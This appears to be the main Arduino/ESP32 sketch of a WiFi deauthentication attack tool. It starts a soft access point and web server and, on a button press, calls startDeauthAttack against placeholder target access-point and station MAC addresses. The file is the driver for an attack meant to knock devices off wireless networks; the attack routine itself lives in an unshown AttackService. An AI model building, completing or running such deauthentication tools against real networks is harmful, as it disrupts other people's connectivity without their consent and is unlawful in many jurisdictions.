#include <Arduino.h>
#include <WiFi.h>

#include "Networks/Services/WifiService.h"
#include "Networks/Services/AttackService.h"

#include "Web/Web.h"

#include "RGB/LedRGB.h"

WifiService wifi;
AttackService attackService;
LedRGB led;
Web server(led);


void setup(){
    led.init();

    Serial.begin(115200);
    Serial.println("Started");
    
    pinMode(0, INPUT_PULLUP);

    wifi.setSoftAPConfig(DEFAULT_AP_CONFIG);
    wifi.softAP();

    server.init();


    IPAddress IP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(IP);

    led.setColor(GREEN);
}

void loop(){
    server.handle();
    if(!digitalRead(0)){
        MacAddress apMac = MacAddress::fromString("TARGET_AP");
        MacAddress staMac = MacAddress::fromString("TARGET_STA");
        
        led.setColor(RED);
        
        attackService.startDeauthAttack(apMac, staMac, 10);
        
        led.setColor(GREEN);

        Serial.println(attackService.getExecutionTime());
    }
    // delay(1000);
    delay(100);
}